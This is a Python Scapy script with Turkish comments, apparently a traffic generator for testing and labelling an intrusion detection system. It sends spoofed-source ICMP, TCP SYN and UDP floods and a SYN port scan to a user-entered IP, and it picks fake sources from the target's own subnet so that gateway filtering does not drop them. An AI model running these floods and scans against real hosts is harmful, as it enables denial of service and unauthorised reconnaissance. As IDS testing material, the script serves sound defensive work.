import time
import sys
from scapy.all import IP, TCP, UDP, ICMP, Ether, sendp, RandShort, getmacbyip, conf

TARGET = input("Hedef IP (IDS bilgisayarı): ").strip()
if not TARGET:
    print("IP girilmedi, çıkılıyor.")
    sys.exit(1)

# Sahte kaynak IP'leri hedefle aynı /24 subnet'ten seç.
# Gateway kendi subnet'ini filtrelemez; 10.10.10.x gibi yabancı IP'leri düşürür.
_base = ".".join(TARGET.split(".")[:3])
FAKE_ICMP = f"{_base}.201"
FAKE_SYN  = f"{_base}.202"
FAKE_UDP  = f"{_base}.203"
FAKE_SCAN = f"{_base}.204"
FAKE_PREFIX = _base + "."   # capture.py true_lbl eşleşmesi için

print(f"\nHedef: {TARGET}")
print(f"Sahte kaynaklar: {FAKE_SYN}, {FAKE_ICMP}, {FAKE_UDP}, {FAKE_SCAN}")
print("=" * 40)

def _resolve_mac(target_ip):
    """
    Üç adımda next-hop MAC çözümü:
    1) Direkt ARP (aynı subnet)
    2) Hedefe özel route gateway
    3) Default gateway (en yaygın durum: farklı subnet)
    """
    mac = getmacbyip(target_ip)
    if mac:
        return mac, target_ip, "direkt"

    try:
        _, _, gw = conf.route.route(target_ip)
        if gw and gw != "0.0.0.0":
            mac = getmacbyip(gw)
            if mac:
                return mac, gw, f"gateway ({gw})"
    except Exception:
        pass

    try:
        _, _, dgw = conf.route.route("0.0.0.0")
        if dgw and dgw != "0.0.0.0":
            mac = getmacbyip(dgw)
            if mac:
                return mac, dgw, f"default gateway ({dgw})"
    except Exception:
        pass

    return None, None, "başarısız"

print("[*] Rota ve MAC adresi çözülüyor...")
TARGET_MAC, _, _how = _resolve_mac(TARGET)
if not TARGET_MAC:
    print("[!] MAC çözülemedi. Hedef makineye ping atabildiğini kontrol et.")
    sys.exit(1)

print(f"[+] Next-hop MAC: {TARGET_MAC}  ({_how})")

def _send(pkt):
    """Layer-2 gönderim — next-hop MAC ile, broadcast yok."""
    sendp(Ether(dst=TARGET_MAC) / pkt, verbose=False)


def ping_flood(count=100):
    print(f"\n[ICMP] Ping flood → {TARGET} ({count} paket)")
    for i in range(count):
        _send(IP(src=FAKE_ICMP, dst=TARGET) / ICMP())
        time.sleep(0.01)
    print("[ICMP] Tamamlandi.")


def syn_flood(port=80, count=300):
    print(f"\n[TCP SYN] SYN flood → {TARGET}:{port} ({count} paket)")
    for i in range(count):
        _send(IP(src=FAKE_SYN, dst=TARGET) / TCP(dport=port, flags="S", sport=RandShort()))
        time.sleep(0.005)
    print("[TCP SYN] Tamamlandi.")


def port_scan(ports=None):
    if ports is None:
        ports = [21, 22, 23, 25, 79, 80, 110, 135, 139,
                 143, 445, 512, 513, 514, 1433, 3306, 5432, 8080]
    print(f"\n[PROBE] Port tarama → {TARGET} ({len(ports)} port)")
    for port in ports:
        _send(IP(src=FAKE_SCAN, dst=TARGET) / TCP(dport=port, flags="S", sport=RandShort()))
        time.sleep(0.05)
    print("[PROBE] Tamamlandi.")


def udp_flood(port=6000, count=100):
    print(f"\n[UDP] UDP flood → {TARGET}:{port} ({count} paket)")
    for i in range(count):
        _send(IP(src=FAKE_UDP, dst=TARGET) / UDP(dport=port, sport=RandShort()) / b"XXXXXXXX")
        time.sleep(0.01)
    print("[UDP] Tamamlandi.")


def menu():
    print("\nSaldiri tipleri:")
    print("  1 — ICMP Ping Flood    (DoS)")
    print("  2 — TCP SYN Flood      (DoS)")
    print("  3 — Port Tarama        (Probe)")
    print("  4 — UDP Flood          (DoS)")
    print("  5 — Hepsini sirayla")
    print("  0 — Cikis")
    return input("\nSecim: ").strip()


while True:
    secim = menu()
    if secim == "1":
        ping_flood()
    elif secim == "2":
        syn_flood()
    elif secim == "3":
        port_scan()
    elif secim == "4":
        udp_flood()
    elif secim == "5":
        ping_flood()
        syn_flood()
        port_scan()
        udp_flood()
        print("\nTum saldirilar tamamlandi.")
    elif secim == "0":
        print("Cikiliyor.")
        break
    else:
        print("Gecersiz secim.")
